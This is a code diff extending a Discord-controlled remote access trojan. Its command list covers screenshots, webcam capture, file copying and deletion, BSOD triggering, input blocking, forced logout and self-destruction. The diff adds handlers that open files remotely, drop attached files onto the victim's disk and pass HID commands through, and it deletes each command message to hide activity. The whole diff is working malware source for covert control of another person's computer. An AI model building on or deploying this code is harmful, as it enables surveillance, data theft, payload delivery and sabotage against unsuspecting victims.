@@ -45,22 +45,25 @@ async def on_message(message):
     if message.content.startswith(".help"):
         await message.delete()
         commandlist = """
-            .help - Get command list
-            .pcinfo - Get computer information
-            .shutdown - Shutdown computer
-            .hardware - Get hardware information
-            .dir - Get directory
-            .tasklist - Get tasklist
-            .taskkill - Kill task
-            .screenshot - Take screenshot
-            .copy - Copy file
-            .bsod - BSOD
-            .webcam - Take webcamshot
-            .logout - Logout
-            .delete - Delete file
-            .blockinput - Block input
-            .unblockinput - Unblock input
-            .selfdestruct - Deletes all traces of the bot
+            .pcinfo - Fetch information about the computer using the systeminfo command in command prompt.
+            .hardware - Fetch information about the computer's hardware using WMIC. [GPU/CPU Name, HWID, RAM Capacity, Disk Capacity]
+            .shutdown - Shutdown the computer.
+            .dir - List the specified directory's files. Usage: .dir <full path>
+            .tasklist - List all tasks with a specific name. Usage: .tasklist <program name>. Example: .tasklist opera.exe
+            .taskkill - Kill a specified task. Usage: .taskkill <PID>
+            .screenshot - Take a screenshot.
+            .copy - Copy a specified file. Usage: .copy <full file path>. Example: .copy c:/Users/user/Desktop/textfile.txt
+            .bsod - Trigger a BSOD.
+            .webcam - Take a picture using the webcamera.
+            .logout - Logout the user from the computer.
+            .delete - Delete a specified file. Usage: .delete <full file path>. Example: .delete c:/Users/user/Desktop/textfile.txt
+            .upload - Upload a file to the computer. Usage: .upload <full file path>. You need to use the file that you want to upload as message attachment. Example: .upload c:/Users/user/Desktop/textfile.txt <attachment>
+            .blockinput - Block all input from the user's keyboard and mouse.
+            .unblockinput - Unblock all input from the user's keyboard and mouse.
+            .selfdestruct - Run a .bat file that removes the bot and all it's features from the computer.
+            .deletedir - Delete a directory. Usage: .deletedir <full dir path>. Example: .deletedir c:/Users/user/Desktop/MyFolder BROKEN
+            .createdir - Create a directory. Usage: .createdir <new dir path>. Example .createdir c:/Users/user/Desktop/MyNewFolder
+            .modules - List/run modules in the /modules folder. Usage: .modules <list/load> BROKEN
         """
         embed = discord.Embed(title="Command list", description=commandlist)
         await message.channel.send(embed=embed)
@@ -111,6 +114,43 @@ async def on_message(message):
             await message.channel.send(embed=embed)
             return
         embed = discord.Embed(title="Directory", description=result, color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+    #OPEN FILE
+    if message.content.startswith(".open"):
+        file_path = message.content.replace(".open ", "")
+        await message.delete()
+        try:
+            os.startfile(file_path)
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Open File", description="Failed to open file.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+        embed = discord.Embed(title="Open File", description="File opened.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+    #UPLOAD FILE
+    if message.content.startswith(".upload"):
+        try:
+            directory = (message.content.replace(".dir ", "")).split(" ")[1]
+        except:
+            embed = discord.Embed(title="Upload failed", description="No directory specified. To upload in curent direcotry use ./", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+        if not os.path.exists(directory):
+            os.mkdir(directory)
+        await message.delete()
+        if message.attachments:
+            for attachment in message.attachments:
+                try:
+                    await attachment.save(f'{directory}/{attachment.filename}')
+                    embed = discord.Embed(title="Upload succesfull", description=f"File {attachment.filename} uploaded.", color=0x00ff00)
+                except Exception as e:
+                    print(e)
+                    embed = discord.Embed(title="Upload failed", description="Failed to upload file.", color=0x00ff00)
+        else:
+            embed = discord.Embed(title="Upload failed", description="No file attached.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
     #TASKLIST - TO FIX
@@ -204,6 +244,13 @@ async def on_message(message):
             embed = discord.Embed(title="Delete", description="Failed to delete file.", color=0x00ff00)
             return
         embed = discord.Embed(title="Delete", description="File deleted.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+    #HID
+    if message.content.startswith(".hid"):
+        await message.delete()
+        result = pc.hid(command=message.content.replace(".hid ", ""))
+        embed = discord.Embed(title="HID", description=result, color=0x00ff00)
         await message.channel.send(embed=embed)
 
     #BLOCK INPUT
